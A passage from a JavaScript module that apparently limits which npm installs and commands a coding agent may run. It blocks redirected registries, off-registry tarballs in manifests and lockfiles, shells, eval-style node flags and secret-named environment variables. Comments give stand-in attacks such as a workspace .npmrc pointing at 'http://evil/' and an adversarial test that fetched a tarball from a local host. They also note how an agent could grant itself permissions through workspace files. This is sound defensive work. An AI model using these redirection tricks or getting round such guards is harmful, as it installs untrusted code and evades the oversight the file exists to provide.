    if (!v.ok) return v;
  }
  return { ok: true, name, version };
}

/** npm's own name rule, minus the historical uppercase names nobody publishes. */
function isPlainPackageWord(word) {
  return /^[a-z0-9][a-z0-9._-]*$/.test(word);
}

/**
 * ⚠️ A VERSION, NOT A RANGE EXPRESSION. `zod@4.1.12`, `zod@^4`, `zod@latest`
 * are all a human can check at a glance. `zod@>=1 || <9`, `zod@*` and `zod@x`
 * are ranges whose resolved answer changes between two runs of the same
 * command, which makes the receipt below a lie. Narrow on purpose.
 */
const INSTALL_DIST_TAGS = new Set(['latest', 'next', 'beta', 'alpha', 'rc', 'canary']);
function validateInstallVersion(version, whole) {
  if (!version) return { ok: false, error: `"${whole}" ends with "@" and no version` };
  if (INSTALL_DIST_TAGS.has(version)) return { ok: true };
  if (!/^[~^]?[0-9]+(\.[0-9]+)*(-[0-9A-Za-z.]+)?(\+[0-9A-Za-z.]+)?$/.test(version)) {
    return {
      ok: false,
      error: `"${version}" is not a version this agent may ask for. Use an exact version (4.1.12), a caret or tilde on one (^4.1.12), or a dist-tag (${[...INSTALL_DIST_TAGS].join(', ')}). A range expression resolves differently on different days, so what was installed could not be stated afterwards.`,
    };
  }
  return { ok: true };
}

/**
 * ── ⚠️⚠️⭐ THE WORKSPACE `.npmrc` UNDOES EVERYTHING ABOVE, AND THE AGENT CAN
 *    WRITE IT ────────────────────────────────────────────────────────────────
 *
 * npm reads `<workspace>/.npmrc` before the user's and the global one. It is a
 * file inside the workspace, so `write_file('.npmrc', 'registry=http://evil/')`
 * is one tool call — and after it, `npm install zod` fetches "zod" from a
 * machine of the attacker's choosing while every check in this file still
 * passes, because the SPEC was perfectly valid. That is the same shape as the
 * `package.json` scripts bypass this module already closes, arriving through a
 * different file.
 *
 * ⭐ So the install refuses when the workspace `.npmrc` changes WHERE code comes
 * from or WHETHER scripts run. Note the asymmetry, which is deliberate:
 * `ignore-scripts=true` is fine (it is stricter than us); `ignore-scripts=false`
 * refuses, even though the forced CLI flag would beat it — because a repository
 * that asks for install scripts is a repository whose install a human should
 * run, and refusing says so instead of silently doing something else.
 *
 * ⚠️ ONLY THE WORKSPACE FILE IS INSPECTED. `~/.npmrc` and the global config are
 * the operator's, the agent cannot write them, and second-guessing them would
 * break every corporate registry on earth.
 *
 * @param {string} text contents of the workspace `.npmrc`
 */
export function inspectNpmrcForInstall(text) {
  const lines = String(text ?? '').split(/\r?\n/);
  for (const raw of lines) {
    const line = raw.trim();
    if (!line || line.startsWith('#') || line.startsWith(';') || line.startsWith('[')) continue;
    const eq = line.indexOf('=');
    if (eq === -1) continue;
    const key = line.slice(0, eq).trim().toLowerCase();
    const value = line.slice(eq + 1).trim().replace(/^["']|["']$/g, '');
    if (key === 'registry' || key.endsWith(':registry')) {
      if (!/^https:\/\/registry\.npmjs\.org\/?$/i.test(value)) {
        return { ok: false, error: `.npmrc in this workspace points ${key} at ${JSON.stringify(value)}. That file is inside the workspace, so the agent can write it — an install that honoured it would fetch code from a host nobody in this repository agreed to. Remove the line, or run this install yourself.` };
      }
      continue;
    }
    if (key === 'ignore-scripts' && /^(false|0|no|off)$/i.test(value)) {
      return { ok: false, error: '.npmrc in this workspace sets ignore-scripts=false. Install scripts never run through this agent, so this repository\'s install is one a human should run.' };
    }
    if (key === 'script-shell' || key === 'shell') {
      return { ok: false, error: `.npmrc in this workspace sets ${key}, which chooses the program npm hands scripts to. A shell is the one thing no layer of this package will select.` };
    }
    if (key === 'unsafe-perm' && /^(true|1|yes|on)$/i.test(value)) {
      return { ok: false, error: '.npmrc in this workspace sets unsafe-perm=true, which exists only to make lifecycle scripts run with more privilege. They do not run here at all.' };
    }
  }
  return { ok: true };
}

/**
 * ── ⚠️⚠️ THE THIRD DOOR INTO THE SAME ROOM ─────────────────────────────────
 *
 * `validateInstallSpec` refuses a URL, a git repo, `user/repo` and an `npm:`
 * alias — WHEN THE AGENT TYPES IT AS AN OPERAND. `inspectNpmrcForInstall`
 * refuses a redirected registry. Both exist because the workspace is writable.
 *
 * ⚠️ AND `package.json` NAMES THE SAME THINGS, WITH NO OPERAND AT ALL. A bare
 * `npm install` takes zero packages, so `validateNpmInstall` collected an empty
 * list, returned ok, and npm then read the manifest the cloned repository
 * shipped. Reproduced by an adversarial pass: a manifest naming
 * `"zod": "http://127.0.0.1:PORT/anything.tgz"` fetched from the attacker's
 * host, landed the tarball as `node_modules/zod`, exited 0 — and the receipt
 * said `installed: []`, because no operand was ever typed. Every check in this
 * file passed, correctly, on a command that had nothing to check.
 *
 * ⭐ THE RULE IS "NOT A LOCATION", NOT "A TIDY VERSION". This is deliberately
 * LOOSER than `validateInstallVersion`, and the reason is whose choice it is.
 * An operand is the AGENT's choice, so we can insist on a version a human can
 * check at a glance. A manifest is the PROJECT's, already written, and
 * `">=17"`, `"1.x"` and `"*"` are all over real repositories — refusing them
 * would fail correct work, which this package has paid for four times in one
 * day. So the only question asked here is WHERE THE CODE COMES FROM.
 *
 * ⭐ LOCAL PROTOCOLS ARE ALLOWED and that is not an oversight: `file:`,
 * `link:`, `portal:` and `workspace:` fetch nothing from a network. They are
 * how every monorepo on earth refers to its own packages, and lifecycle scripts
 * are already off, so the worst one can do is symlink a directory that is
 * already on this machine.
 *
 * ⚠️ `npm:` IS REFUSED THOUGH IT FETCHES FROM THE REGISTRY, because the
 * resulting `package.json` line reads as the package the human asked for while
 * a different one lands — the same argument `validateInstallSpec` already makes
 * for the operand form, and it calls that one the nastiest.
 *
 * @param {string} text contents of the workspace `package.json`
 */
export function inspectManifestForInstall(text) {
  let pkg;
  try { pkg = JSON.parse(String(text ?? '')); } catch (err) {
    return { ok: false, error: `package.json is not valid JSON, so what it would install cannot be checked: ${err instanceof Error ? err.message : String(err)}` };
  }
  if (!pkg || typeof pkg !== 'object') return { ok: true };

  const refused = [];
  const check = (where, name, raw) => {
    const why = manifestSpecRefusal(String(raw ?? ''));
    if (why) refused.push(`${where}"${name}": ${JSON.stringify(String(raw))} — ${why}`);
  };
  for (const field of ['dependencies', 'devDependencies', 'optionalDependencies', 'peerDependencies']) {
    const deps = pkg[field];
    if (!deps || typeof deps !== 'object' || Array.isArray(deps)) continue;
    for (const [name, raw] of Object.entries(deps)) check(`${field}.`, name, raw);
  }
  /**
   * ⚠️⚠️ `overrides` IS THE SAME ATTACK WITH FAR MORE REACH. It redirects a
   * TRANSITIVE dependency — one nobody reading the direct list would look at —
   * and npm honours it. It nests arbitrarily, so this walks it.
   */
  const walkOverrides = (node, path) => {
    if (!node || typeof node !== 'object' || Array.isArray(node)) return;
    for (const [name, raw] of Object.entries(node)) {
      if (typeof raw === 'string') check(`${path}`, name, raw);
      else if (raw && typeof raw === 'object') {
        if (typeof raw['.'] === 'string') check(`${path}`, `${name}.`, raw['.']);
        walkOverrides(raw, `${path}${name}.`);
      }
    }
  };
  walkOverrides(pkg.overrides, 'overrides.');

  if (refused.length === 0) return { ok: true };
  return {
    ok: false,
    error: `package.json in this workspace installs code from outside the npm registry, so this install is refused:\n  ${refused.slice(0, 8).join('\n  ')}`
      + (refused.length > 8 ? `\n  …and ${refused.length - 8} more` : '')
      + '\nThat file is inside the workspace and this agent can write it, and a cloned repository ships its own. '
      + 'A dependency that comes from a URL, a git repo or an alias is one a human should install.',
  };
}

/** Protocols that resolve to something already on this machine — no network. */
const LOCAL_DEP_PROTOCOLS = new Set(['file', 'link', 'portal', 'workspace']);

/** @returns {string|null} why this manifest spec is a location, or null if it is fine. */
function manifestSpecRefusal(spec) {
  const text = spec.trim();
  if (!text) return null; // npm treats "" as "*"; it is not a location.
  const colon = text.indexOf(':');
  if (colon > 0) {
    const proto = text.slice(0, colon).toLowerCase();
    if (LOCAL_DEP_PROTOCOLS.has(proto)) return null;
    if (proto === 'npm') return 'an "npm:" alias makes this line name one package while a different one lands';
    return `"${proto}:" fetches code from outside the registry`;
  }
  /**
   * ⚠️ NO PROTOCOL NEEDED FOR THE GITHUB FORM. `user/repo`, `user/repo#branch`
   * and `user/repo#commit` are all fetched from GitHub by npm with no scheme in
   * sight — the shape a reader skims straight past.
   */
  if (text.includes('/')) return 'this is GitHub shorthand (user/repo), which fetches a repository rather than a registry package';
  if (text.startsWith('.') || text.startsWith('~/')) return 'a bare path is resolved as a local directory, not a registry package';
  return null;
}

/**
 * ── ⚠️⚠️ AND THE LOCKFILE, WHICH THIS FILE USED TO CALL THE SAFEST ONE ──────
 *
 * `validateNpmInstall`'s comment said `npm ci` "installs exactly what the
 * lockfile already records, which makes it the SAFEST member of this family: it
 * introduces no name the repository has not already committed to." Every clause
 * is true and the conclusion is backwards. In the threat model this whole file
 * is written for — A REPOSITORY SOMEBODY ELSE WROTE — "the repository has
 * committed to it" is the attack, not the reassurance. `package-lock.json`
 * carries a `resolved` URL per package and npm fetches from it, so a hostile
 * lockfile points anywhere while `package.json` reads as innocent registry
 * names. Closing the manifest and leaving this open would be closing the front
 * door and leaving the back one.
 *
 * ⭐ A `resolved` may be absent (npm omits it for bundled and local entries) and
 * that is not suspicious. Only a PRESENT one that is not the registry is.
 *
 * @param {string} text contents of `package-lock.json`
 */
export function inspectLockfileForInstall(text) {
  let lock;
  try { lock = JSON.parse(String(text ?? '')); } catch (err) {
    return { ok: false, error: `package-lock.json is not valid JSON, so where it would fetch from cannot be checked: ${err instanceof Error ? err.message : String(err)}` };
  }
  if (!lock || typeof lock !== 'object') return { ok: true };

  const offenders = [];
  const visit = (node, where) => {
    if (!node || typeof node !== 'object') return;
    if (typeof node.resolved === 'string' && node.resolved && !isRegistryTarball(node.resolved)) {
      offenders.push(`${where || '(root)'} ← ${node.resolved}`);
    }
    // v2/v3 lockfiles use `packages`; v1 uses `dependencies`. Both are walked,
    // because a lockfile of either shape installs the same way.
    for (const field of ['packages', 'dependencies']) {
      const kids = node[field];
      if (!kids || typeof kids !== 'object' || Array.isArray(kids)) continue;
      for (const [name, child] of Object.entries(kids)) visit(child, name || where);
    }
  };
  visit(lock, '');

  if (offenders.length === 0) return { ok: true };
  return {
    ok: false,
    error: `package-lock.json in this workspace fetches code from outside the npm registry, so this install is refused:\n  ${offenders.slice(0, 8).join('\n  ')}`
      + (offenders.length > 8 ? `\n  …and ${offenders.length - 8} more` : '')
      + '\nA lockfile records WHERE each package comes from, not only its name, so an innocent-looking package.json '
      + 'can still install somebody else\'s code. This is an install a human should run.',
  };
}

/** The one host an install may fetch a tarball from. */
function isRegistryTarball(url) {
  try {
    const u = new URL(String(url));
    return u.protocol === 'https:' && u.hostname.toLowerCase() === 'registry.npmjs.org';
  } catch {
    return false;
  }
}

/**
 * `npm install [flags] [pkg…]` / `npm ci [flags]`, as a pure decision.
 *
 * ⚠️ `ci` TAKES NO PACKAGES BY DEFINITION — it installs exactly what the
 * lockfile already records, and it introduces no name the repository has not
 * already committed to.
 *
 * ⚠️⚠️ THIS USED TO CONCLUDE "WHICH MAKES IT THE SAFEST MEMBER OF THIS FAMILY",
 * AND THAT IS BACKWARDS. Every clause above is true; the conclusion inverts the
 * threat model the rest of this file is written for. A REPOSITORY SOMEBODY ELSE
 * WROTE is the case that matters, and there "the repository has already
 * committed to it" is the attack rather than the reassurance —
 * `package-lock.json` carries a `resolved` URL per package and npm fetches from
 * it. Taking no operands does not make a command safe; it makes it a command
 * with nothing for THIS function to check. See `inspectLockfileForInstall`.
 *
 * @param {string} command the original string, echoed back on success
 * @param {string[]} tokens `['npm', 'install', …]`
 */
function validateNpmInstall(command, tokens) {
  const sub = tokens[1];
  const rest = tokens.slice(2);
  const packages = [];
  for (const token of rest) {
    if (token.startsWith('-')) {
      // ⚠️ `--flag=value` is split so `--registry=http://evil` cannot slip past
      // a check that only looked at whole tokens.
      const head = token.includes('=') ? token.slice(0, token.indexOf('=')) : token;
      const why = REFUSED_INSTALL_FLAGS.get(head);
      if (why) return { ok: false, error: `npm ${sub} ${head} is refused — ${why}.` };
      if (!INSTALL_FLAGS.has(token)) {
        return { ok: false, error: `"${token}" is not a flag this agent may pass to npm ${sub}. Allowed: ${[...INSTALL_FLAGS].join(', ')}.` };
      }
      continue;
    }
    const spec = validateInstallSpec(token);
    if (!spec.ok) return spec;
    packages.push({ raw: token, name: spec.name, version: spec.version ?? null });
  }

  if (sub === 'ci' && packages.length) {
    return { ok: false, error: 'npm ci installs exactly what package-lock.json already records and takes no package names. To add a new dependency use "npm install <package>".' };
  }
  if (packages.length > MAX_INSTALL_PACKAGES) {
    return { ok: false, error: `${packages.length} packages in one install is more than the ${MAX_INSTALL_PACKAGES} allowed here — install them in separate steps so each name is visible on its own line of the transcript.` };
  }
  return { ok: true, command, tokens, binary: 'npm', npmInstall: { sub, packages } };
}

/**
 * ── ⚠️⚠️ WHY THE WORKSPACE FILE MAY ONLY PICK FROM A MENU ───────────────────
 *
 * `policy.mjs` states the problem exactly: **the config lives in the workspace,
 * and the agent can write to the workspace.** It solves it by making every
 * policy field monotone downward — a layer can only ever REMOVE permission, so
 * a hostile `.acuvo/policy.json` is a denial of service against itself.
 *
 * An allowlist of programs cannot be monotone downward: the whole point is to
 * ADD. So the same problem needs a different answer, and the answer is to bound
 * what the addition can possibly be:
 *
 *   **`.acuvo/commands.json` may name PRESETS and nothing else.** Every preset
 *   is a menu item this file vetted — a build/test driver for code already on
 *   disk. `write_file(".acuvo/commands.json", {"presets":["python"]})` therefore
 *   buys the agent a second interpreter for code it could already execute with
 *   `node`. It does not buy a shell, a downloader, or a program of its choosing.
 *
 *   **An arbitrary binary can only be named in `ACUVO_ALLOW_COMMANDS`**, which
 *   is the parent process's environment. The agent has no verb that reaches it —
 *   same argument `policy.mjs` makes for `ACUVO_POLICY_FILE`, and it is why that
 *   variable, not the file, is the actual control.
 *
 * ⚠️ AND THE HONEST LIMIT OF THAT: a workspace file is a project CONVENTION,
 * reviewable in a PR, adequate against mistakes. It is not a control against a
 * determined agent, and nothing inside the workspace can be. What it IS, is
 * bounded — which is the property that makes the difference survivable.
 */
const CONFIG_KEYS = new Set(['presets', 'allow']);

/**
 * The lookup a validator uses: which binaries exist, and the grammar for each.
 * @typedef {{ binaries: string[], grammar: Map<string, BinaryGrammar> }} Allowlist
 */

/** The built-in grammars for the original four, expressed in the same shape. */
const BUILTIN_GRAMMAR = new Map([
  ['node', { builtin: 'node' }],
  ['npm', { builtin: 'npm' }],
  ['npx', { builtin: 'npx' }],
  ['tsc', { builtin: 'tsc' }],
]);

/** @type {Allowlist} */
export const DEFAULT_ALLOWLIST = Object.freeze({
  binaries: Object.freeze([...ALLOWED_BINARIES]),
  grammar: BUILTIN_GRAMMAR,
});

/**
 * Assemble an allowlist from preset names and admin-declared binaries.
 *
 * ⚠️ ADDITIVE ONLY ON TOP OF THE FOUR. The default binaries are always present;
 * there is no configuration that REMOVES one, because that is `policy.mjs`'s job
 * (`forbidTools: ["run_command"]`) and two mechanisms for the same intent is how
 * they drift into disagreeing.
 *
 * @param {{ presets?: string[], allow?: Array<{ binary: string, flags?: string[] }> }} spec
 */
export function buildAllowlist({ presets = [], allow = [] } = {}) {
  const grammar = new Map(BUILTIN_GRAMMAR);
  const binaries = [...ALLOWED_BINARIES];
  for (const name of presets) {
    const preset = COMMAND_PRESETS[name];
    /* c8 ignore next */
    if (!preset) continue; // parsing already refused unknown names
    for (const bin of preset.binaries) {
      if (!binaries.includes(bin)) binaries.push(bin);
      grammar.set(bin, { ...preset.grammar[bin], binary: bin, preset: name });
    }
  }
  for (const decl of allow) {
    if (!binaries.includes(decl.binary)) binaries.push(decl.binary);
    grammar.set(decl.binary, {
      binary: decl.binary,
      flags: new Set(decl.flags ?? []),
      valueFlags: new Set(decl.flags ?? []),
      resolve: 'path',
      /** ⚠️ Marks a binary whose grammar came from a human, not from us — the
       *  refusal message has to say so, because "not an allowed flag" reads as
       *  our decision when it was theirs. */
      custom: true,
    });
  }
  return { binaries, grammar };
}

/** Which preset would unlock this binary? Used to make a refusal actionable. */
function presetProviding(binary) {
  for (const [name, preset] of Object.entries(COMMAND_PRESETS)) {
    if (preset.binaries.includes(binary)) return name;
  }
  return null;
}

function checkBinaryName(name, where) {
  if (typeof name !== 'string' || !name.trim()) {
    return { ok: false, error: `${where}: a binary name must be a non-empty string (got ${JSON.stringify(name)})` };
  }
  const bin = name.trim();
  // ⚠️ Same shape rule as everything else: a name, not a path. `../../bin/sh`
  // and `/bin/sh` are not binary names, they are an attempt to pick a file.
  if (!/^[A-Za-z0-9][A-Za-z0-9._-]*$/.test(bin)) {
    return { ok: false, error: `${where}: "${bin}" is not a plain program name — a path is not accepted here, only a name resolved on PATH` };
  }
  if (NEVER_ALLOWED_BINARIES.has(bin.toLowerCase())) {
    return {
      ok: false,
      error: `${where}: "${bin}" is a shell (or runs one), and it is refused at every layer including this one. A shell parses the command string, which is the exact thing this tool exists to prevent — every other guard here assumes no shell exists.`,
    };
  }
  return { ok: true, binary: bin };
}

function readPresetNames(value, where) {
  if (!Array.isArray(value)) {
    return { ok: false, error: `${where}: "presets" must be an array of strings${typeof value === 'string' ? ` (wrap it: ["${value}"])` : ''}` };
  }
  const out = [];
  for (const item of value) {
    if (typeof item !== 'string' || !item.trim()) {
      return { ok: false, error: `${where}: "presets" contains ${JSON.stringify(item)}, which is not a non-empty string` };
    }
    const name = item.trim();
    if (!COMMAND_PRESETS[name]) {
      const near = PRESET_NAMES.filter((n) => n.startsWith(name.slice(0, 2)) || name.startsWith(n.slice(0, 2)));
      return {
        ok: false,
        error: `${where}: "${name}" is not a preset${near.length ? `. Did you mean ${near.map((n) => `"${n}"`).join(' or ')}?` : ''} Known presets: ${PRESET_NAMES.join(', ')}`,
      };
    }
    if (!out.includes(name)) out.push(name);
  }
  return { ok: true, value: out };
}

/**
 * Parse `.acuvo/commands.json`.
 *
 * ⚠️ FAIL CLOSED, AND AN UNKNOWN KEY IS AN ERROR — the same reasoning
 * `policy.mjs` gives and the same accident being designed against:
 * `{"preset": ["python"]}` is valid JSON, enables nothing, and reads to a human
 * as an enabled ecosystem. A typo whose symptom is "everything looks fine" is
 * the one that survives review.
 *
 * @param {string} text
 * @param {{ label?: string, admin?: boolean }} [opts]
 */
export function parseCommandsConfig(text, { label = COMMANDS_CONFIG_FILE, admin = false } = {}) {
  if (typeof text !== 'string') return { ok: false, error: `${label}: expected the file's text` };
  // ⚠️ A UTF-8 BOM is what Windows editors write, and `JSON.parse` throws on it.
  // Refusing a real file a real user saved is the "check that fails correct
  // work" failure, so it is stripped before parsing rather than diagnosed after.
  const trimmed = text.replace(/^\uFEFF/, '').trim();
  if (!trimmed) {
    return { ok: false, error: `${label}: the file is empty. Write {} for a config that enables nothing, or {"presets":["python"]} to enable an ecosystem.` };
  }
  let doc;
  try {
    doc = JSON.parse(trimmed);
  } catch (err) {
    return { ok: false, error: `${label}: not valid JSON — ${err instanceof Error ? err.message : String(err)}` };
  }
  if (typeof doc !== 'object' || doc === null || Array.isArray(doc)) {
    return { ok: false, error: `${label}: the top level must be a JSON object` };
  }
  for (const key of Object.keys(doc)) {
    if (!CONFIG_KEYS.has(key)) {
      return { ok: false, error: `${label}: unknown setting "${key}". A misspelled key enables nothing and reads like it enabled something. Known: ${[...CONFIG_KEYS].join(', ')}` };
    }
  }

  const out = { presets: [], allow: [] };
  if ('presets' in doc) {
    const p = readPresetNames(doc.presets, label);
    if (!p.ok) return p;
    out.presets = p.value;
  }
  if ('allow' in doc) {
    if (!admin) {
      return {
        ok: false,
        error: `${label}: "allow" names an arbitrary program, and this file is inside the workspace — the agent can write it, so a grant here would be the agent granting itself. Presets are allowed here because every preset is a vetted menu item. To add a program of your own, set ${ALLOW_COMMANDS_ENV} in the environment that launches the CLI.`,
      };
    }
    if (!Array.isArray(doc.allow)) return { ok: false, error: `${label}: "allow" must be an array` };
    for (const entry of doc.allow) {
      const raw = typeof entry === 'string' ? { binary: entry } : entry;
      if (typeof raw !== 'object' || raw === null) return { ok: false, error: `${label}: "allow" contains ${JSON.stringify(entry)}, which is not a name or an object` };
      const named = checkBinaryName(raw.binary, label);
      if (!named.ok) return named;
      let flags = [];
      if ('flags' in raw) {
        if (!Array.isArray(raw.flags)) return { ok: false, error: `${label}: "flags" for ${named.binary} must be an array of strings` };
        for (const f of raw.flags) {
          if (typeof f !== 'string' || !f.trim()) return { ok: false, error: `${label}: "flags" for ${named.binary} contains ${JSON.stringify(f)}` };
          flags.push(f.trim());
        }
      }
      out.allow.push({ binary: named.binary, flags });
    }
  }
  return { ok: true, config: out };
}

/**
 * Parse `ACUVO_ALLOW_COMMANDS`.
 *
 * Comma-separated. An entry that names a preset enables it; anything else is a
 * binary declaration, optionally with its flags: `ruff:check|--fix`.
 *
 * ⚠️ A BARE BINARY GETS NO FLAGS, and that is deliberate rather than lazy. We do
 * not know a stranger binary's argument semantics — `-c` means "config" to one
 * program and "execute this string" to the next — so guessing a generic flag
 * shape would be a guard that pretends. The person adding the binary knows, so
 * they say, and the refusal message tells them where.
 *
 * @param {unknown} raw
 */
export function parseAllowCommandsEnv(raw) {
  const where = ALLOW_COMMANDS_ENV;
  if (raw === undefined || raw === null) return { ok: true, presets: [], allow: [], stated: false };
  if (typeof raw !== 'string') return { ok: false, error: `${where}: expected a string` };
  const text = raw.trim();
  if (!text) return { ok: true, presets: [], allow: [], stated: false };

  const presets = [];
  const allow = [];
  for (const piece of text.split(',')) {
    const entry = piece.trim();
    if (!entry) continue;
    const colon = entry.indexOf(':');
    const name = (colon === -1 ? entry : entry.slice(0, colon)).trim();
    if (colon === -1 && COMMAND_PRESETS[name]) {
      if (!presets.includes(name)) presets.push(name);
      continue;
    }
    const named = checkBinaryName(name, where);
    if (!named.ok) return named;
    const flags = colon === -1
      ? []
      : entry.slice(colon + 1).split('|').map((f) => f.trim()).filter(Boolean);
    allow.push({ binary: named.binary, flags });
  }
  return { ok: true, presets, allow, stated: true };
}

/**
 * Fold both layers into one allowlist. PURE — it takes text, not paths, exactly
 * like `loadPolicy`, so the whole decision is testable without a disk.
 *
 * @param {{ configText?: string|null, configLabel?: string, envValue?: unknown }} [input]
 */
export function resolveCommandAllowlist({ configText = null, configLabel = COMMANDS_CONFIG_FILE, envValue = undefined } = {}) {
  const sources = [];
  let presets = [];
  let allow = [];

  const env = parseAllowCommandsEnv(envValue);
  if (!env.ok) return env;
  if (env.stated) {
    presets = [...presets, ...env.presets];
    allow = [...allow, ...env.allow];
    sources.push({ label: ALLOW_COMMANDS_ENV, trusted: true });
  }

  if (configText !== null && configText !== undefined) {
    const parsed = parseCommandsConfig(configText, { label: configLabel, admin: false });
    if (!parsed.ok) return parsed;
    for (const p of parsed.config.presets) if (!presets.includes(p)) presets.push(p);
    sources.push({ label: configLabel, trusted: false });
  }

  return { ok: true, allowlist: buildAllowlist({ presets, allow }), sources, presets };
}

/**
 * ⚠️ A DIFFERENT LIST FOR `package.json` SCRIPT BODIES, AND THE DIFFERENCE IS
 * DELIBERATE IN BOTH DIRECTIONS.
 *
 * `vitest` is added, because `"test": "vitest run"` is what a real project
 * contains and refusing it would make the npm layer useless. `npm` and `npx`
 * are REMOVED, because a script that shells out to another script is a chain
 * this validator would have to follow to stay honest — and a validator that
 * checks the first link and waves the rest through is worse than one that says
 * "I cannot verify this" and refuses.
 */
export const ALLOWED_SCRIPT_BINARIES = ['node', 'vitest', 'tsc'];

/** `npx <package>` downloads and executes a stranger's code. Two packages, and
 *  `--no` is injected at spawn time so even these can never be fetched. */
export const ALLOWED_NPX_PACKAGES = ['vitest', 'tsc'];

/**
 * ⚠️ THE CHARACTER WHITELIST. Same doctrine as `workspace.mjs`: enumerate what
 * is allowed, never what is forbidden. Every quoting trick, every encoding of
 * `;`, every newline-as-second-command and every `$IFS` cleverness dies here
 * without anyone having had to think of it first.
 *
 * `:` earns its place because `npm run build:prod` is normal. `=` because
 * `--reporter=basic` is normal. That is the whole justification for both.
 */
/**
 * ── ⚠️⭐ `*` AND `?` ARE ALLOWED, AND REFUSING THEM WAS PURE LOSS ────────────
 *
 * The whitelist blocked them as "shell metacharacters". They are not dangerous
 * HERE, and the reason is the same one this whole file rests on: **there is no
 * shell.** A glob cannot start a second command, cannot redirect, cannot
 * substitute. Unexpanded, it is an ordinary string argument.
 *
 * ⚠️ AND THE COST WAS ABSURD: `node --test test/*.test.mjs` is the single most
 * common test invocation in modern Node, and it is **this package's own test
 * script** — so Acuvo Code could not run Acuvo Code's test suite. Measured: it
 * cost a real eval task an entire round, and the model had no way to recover
 * because the refusal named a rule rather than an alternative.
 *
 * ⭐ VERIFIED RATHER THAN ASSUMED: spawned with `shell: false`, the literal
 * `test/*.test.mjs` reaches node and **node expands it itself** — 316 tests, exit
 * 0. The glob never needed a shell; we were protecting against an expansion that
 * only a shell performs.
 *
 * ⚠️ Everything genuinely dangerous stays refused: & | ; < > ( ) ` $ quotes and
 * newlines. Path containment is unaffected — a glob argument is still resolved
 * and still refused if it escapes the workspace, which is checked downstream and
 * not here.
 */
/**
 * ── ⚠️⭐ `@` WAS BLOCKED, AND IT BLOCKED TWO ORDINARY THINGS ────────────────
 *
 * MEASURED while building the install gate: `@` was not in this class, so
 * `npm install @types/node` and `zod@4.1.12` were refused by the TOKENIZER —
 * before any install policy ran — with a message about an unsafe character.
 * Worse, and entirely unrelated to installs, so was
 * `node node_modules/@scope/pkg/cli.js`: every scoped package's own files were
 * unreachable to `run_command`, which is a large fraction of modern
 * `node_modules`.
 *
 * ⭐ It is safe here for exactly the reason `*` and `?` are (see above): THERE
 * IS NO SHELL. `@` cannot start a second command, cannot redirect, cannot
 * substitute; in `sh` it is not a metacharacter at all, and in `cmd.exe` its
 * only meaning is echo-suppression at the start of a BATCH LINE, which never
 * exists because nothing is ever handed to `cmd`. Unexpanded it is an ordinary
 * string, and every operand still goes through `normalizeRelativePath`.
 *
 * ⚠️ THESE TWO REGEXES MUST STAY THE EXACT COMPLEMENT OF EACH OTHER. They are
 * written twice (one to accept, one to name the offending character) and a
 * character present in `UNSAFE_CHAR`'s class but missing from
 * `SAFE_COMMAND_CHARS` produces a command refused with "contains ''" — a defect
 * that reads like a rule.
 *
 * ⚠️ MEASURED WITH MUTATION, AND ONLY ONE DIRECTION IS OBSERVABLE: dropping `@`
 * from `SAFE_COMMAND_CHARS` turns `test/npm-install.test.mjs` red; dropping it
 * from `UNSAFE_CHAR` alone changes NOTHING, because `SAFE_COMMAND_CHARS` is
 * consulted first and returns early. That second drift is latent rather than
 * live — it becomes a bug the moment the first list shrinks — so it is written
 * down here rather than pretended to be tested.
 */
const SAFE_COMMAND_CHARS = /^[A-Za-z0-9 ._\-/=:*?@]+$/;
const UNSAFE_CHAR = /[^A-Za-z0-9 ._\-/=:*?@]/;

/**
 * Flags whose refusal needs a REASON, because "not on the allowlist" would be
 * misleading — these are not omissions, they are closed doors.
 */
const REFUSED_NODE_FLAGS = new Map([
  ['-e', 'code passed with --eval is never written to disk, so nothing it did can be reviewed afterwards'],
  ['--eval', 'code passed with --eval is never written to disk, so nothing it did can be reviewed afterwards'],
  ['-p', 'code passed with --print is never written to disk, so nothing it did can be reviewed afterwards'],
  ['--print', 'code passed with --print is never written to disk, so nothing it did can be reviewed afterwards'],
  ['--input-type', 'it exists to make --eval work, and --eval is refused'],
  ['-r', '--require preloads a module the command does not name; write a file and run it instead'],
  ['--require', '--require preloads a module the command does not name; write a file and run it instead'],
  ['--import', '--import preloads a module the command does not name; write a file and run it instead'],
  ['--loader', 'a custom loader rewrites every module that follows it'],
  ['--experimental-loader', 'a custom loader rewrites every module that follows it'],
  ['--env-file', 'it loads secrets into the child, and this tool exists partly to keep them out'],
  ['--inspect', 'a debugger port is a remote control on the process'],
  ['--inspect-brk', 'a debugger port is a remote control on the process'],
  ['--watch', 'a watcher never exits, so it would spend the whole timeout and return nothing'],
  ['--watch-path', 'a watcher never exits, so it would spend the whole timeout and return nothing'],
]);

const NODE_FLAGS = new Set([
  '--test', '--check', '--version', '-v',
  '--no-warnings', '--trace-warnings', '--no-deprecation',
  '--experimental-strip-types', '--experimental-vm-modules',
]);
const NODE_VALUE_FLAGS = new Set(['--test-reporter', '--test-concurrency', '--test-name-pattern']);

const VITEST_FLAGS = new Set(['--run', '--no-color', '--silent', '--passWithNoTests', '--globals']);
const VITEST_VALUE_FLAGS = new Set(['--reporter', '--bail', '--config', '--testTimeout']);

const TSC_FLAGS = new Set(['--noEmit', '--strict', '--pretty', '--skipLibCheck', '--listFiles', '-p', '--project']);
const TSC_VALUE_FLAGS = new Set(['--project', '--target', '--module']);
const REFUSED_TSC_FLAGS = new Map([
  ['-w', 'a watcher never exits, so it would spend the whole timeout and return nothing'],
  ['--watch', 'a watcher never exits, so it would spend the whole timeout and return nothing'],
]);

/**
 * ⚠️ THE ENVIRONMENT SCRUB.
 *
 * A command this tool runs is a Node process with network access. If
 * `OPENROUTER_API_KEY` is in its environment then the loop's own credential is
 * one `fetch` away from anywhere, and the agent wrote the code doing the
 * fetching. That is not a hypothetical attack, it is the default arrangement of
 * a developer's shell.
 *
 * ⚠️ THIS IS A DENYLIST AND THAT IS A CONSCIOUS EXCEPTION to the whitelist rule
 * the rest of this package follows. An allowlist of variable names would break
 * ordinary test suites constantly — half of them read some `*_URL` or feature
 * flag — and a safety feature that gets switched off is worth nothing. So the
 * honest statement of the guarantee: the pattern below catches conventionally
 * named secrets and always removes this CLI's own key. A variable called
 * `MY_DB_STRING` would survive. Treat it as one layer, not as the boundary.
 */
const SECRET_NAME = /(KEY|TOKEN|SECRET|PASSWORD|PASSWD|CREDENTIAL|PRIVATE|SESSION|COOKIE|AUTH|_DSN$|CONNECTION_STRING)/i;

/**
 * ⭐ EXPORTED SO NOBODY WRITES A SECOND COPY. `mcp-consent.mjs` has to decide
 * whether an env VALUE is safe to print in an approval prompt, and that is the
 * same question this regex already answers — one list, one place, one set of
